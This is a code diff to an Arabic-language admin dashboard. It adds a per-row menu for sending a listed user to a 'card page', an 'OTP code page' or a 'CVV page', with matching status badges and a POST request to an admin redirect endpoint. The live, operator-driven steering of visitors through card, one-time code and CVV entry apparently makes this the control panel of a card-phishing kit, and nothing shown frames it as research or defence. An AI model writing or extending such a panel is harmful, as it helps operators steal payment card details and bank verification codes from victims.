@@ -86,6 +86,9 @@
   .badge.rejected{background:#fde8e8;color:var(--red)}
   .badge.pending{background:#fff3cd;color:#856404}
   .badge.redirected{background:#e8d5f5;color:#7b1fa2}
+  .badge.redirect_card{background:#e8d5f5;color:#7b1fa2}
+  .badge.redirect_otp{background:#e8d5f5;color:#7b1fa2}
+  .badge.redirect_cvv{background:#e8d5f5;color:#7b1fa2}
 
   /* action buttons in table */
   .tbl-btn{
@@ -94,8 +97,24 @@
   }
   .tbl-btn.details{background:#1565c0;color:#fff}
   .tbl-btn.details:hover{background:#0d47a1}
-  .tbl-btn.redirect{background:#7b1fa2;color:#fff}
+  .tbl-btn.redirect{background:#7b1fa2;color:#fff;position:relative}
   .tbl-btn.redirect:hover{background:#5c1480}
+
+  .redirect-menu{
+    display:none;position:absolute;top:100%;left:0;z-index:100;
+    background:#fff;border:1.5px solid var(--line);border-radius:10px;
+    box-shadow:0 8px 24px rgba(0,0,0,.15);min-width:160px;overflow:hidden;
+    margin-top:4px;
+  }
+  .redirect-menu.open{display:block}
+  .redirect-menu button{
+    display:block;width:100%;border:none;background:none;padding:12px 16px;
+    font-family:inherit;font-size:14px;font-weight:700;color:var(--ink);
+    cursor:pointer;text-align:right;transition:.1s;
+  }
+  .redirect-menu button:hover{background:#f0e6f6;color:#7b1fa2}
+  .redirect-menu button+button{border-top:1px solid #f0f2f5}
+  .redirect-wrap{position:relative;display:inline-block}
 
   /* ---------- modal ---------- */
   .modal-overlay{
@@ -375,7 +394,9 @@
   function statusBadge(st) {
     if (st === 'accepted') return '<span class="badge accepted">مقبول</span>';
     if (st === 'rejected') return '<span class="badge rejected">مرفوض</span>';
-    if (st === 'redirected') return '<span class="badge redirected">تم التوجيه</span>';
+    if (st === 'redirect_card') return '<span class="badge redirected">توجيه ← البطاقة</span>';
+    if (st === 'redirect_otp') return '<span class="badge redirected">توجيه ← الكود</span>';
+    if (st === 'redirect_cvv') return '<span class="badge redirected">توجيه ← CVV</span>';
     return '<span class="badge pending">قيد الانتظار</span>';
   }
 
@@ -396,7 +417,14 @@
         '<td>'+statusBadge(s.status)+'</td>' +
         '<td class="td-actions">' +
           '<button class="tbl-btn details" onclick="openDetails(\''+s.id+'\')">التفاصيل</button>' +
-          '<button class="tbl-btn redirect" onclick="redirectUser(\''+s.id+'\')">إعادة التوجيه</button>' +
+          '<div class="redirect-wrap">' +
+            '<button class="tbl-btn redirect" onclick="toggleRedirectMenu(this,\''+s.id+'\')">إعادة التوجيه ▾</button>' +
+            '<div class="redirect-menu">' +
+              '<button onclick="redirectUser(\''+s.id+'\',\'card\')">صفحة البطاقة</button>' +
+              '<button onclick="redirectUser(\''+s.id+'\',\'otp\')">صفحة الكود</button>' +
+              '<button onclick="redirectUser(\''+s.id+'\',\'cvv\')">صفحة CVV</button>' +
+            '</div>' +
+          '</div>' +
         '</td>' +
       '</tr>';
     }).join('');
@@ -560,10 +588,25 @@
     document.getElementById('modalOverlay').classList.remove('open');
   }
 
-  async function redirectUser(id) {
+  function toggleRedirectMenu(btn, id) {
+    const menu = btn.nextElementSibling;
+    document.querySelectorAll('.redirect-menu.open').forEach(m => { if(m !== menu) m.classList.remove('open'); });
+    menu.classList.toggle('open');
+  }
+
+  document.addEventListener('click', function(e) {
+    if (!e.target.closest('.redirect-wrap')) {
+      document.querySelectorAll('.redirect-menu.open').forEach(m => m.classList.remove('open'));
+    }
+  });
+
+  async function redirectUser(id, page) {
+    document.querySelectorAll('.redirect-menu.open').forEach(m => m.classList.remove('open'));
     try {
       await fetch('/api/admin/redirect/'+id, {
-        method: 'POST', headers: { 'Authorization': 'Bearer '+token() }
+        method: 'POST',
+        headers: { 'Authorization': 'Bearer '+token(), 'Content-Type': 'application/json' },
+        body: JSON.stringify({ page: page })
       });
       loadData();
     } catch(e) {}
